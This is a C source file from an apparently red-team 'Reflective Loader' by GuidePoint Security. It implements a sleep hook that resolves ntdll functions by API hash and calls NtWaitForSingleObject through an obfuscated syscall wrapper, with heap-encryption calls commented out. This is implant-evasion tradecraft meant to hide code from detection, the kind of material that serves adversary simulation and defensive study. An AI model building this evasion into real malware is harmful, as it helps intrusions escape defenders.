/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtWaitForSingleObject );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Goes to sleep using NtWaitForSingleObject, and awaits
 * on the result.
 *
!*/

D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
{
	API		Api;
	LARGE_INTEGER	Del;

	BYTE		Key[ 16 ];

	PVOID*		Arg = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );

	/* Random Key Generation */
	RandomString( &Key, sizeof( Key ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Encrypt the heap */
	//HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Allocate a buffer for the arguments */
	if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) ) {
		/* Execute NtWaitForSingleObject */
		Del.QuadPart = -10000LL * WaitTime;
		Arg[ 0 ] = C_PTR( NtCurrentProcess() );
		Arg[ 1 ] = C_PTR( FALSE );
		Arg[ 2 ] = C_PTR( &Del );

		ObfSystemCall( Api.NtWaitForSingleObject, Arg, 3 );

		/* Free the argument buffer */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Arg );
	};

	/* Decrypt the heap */
	//HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
}
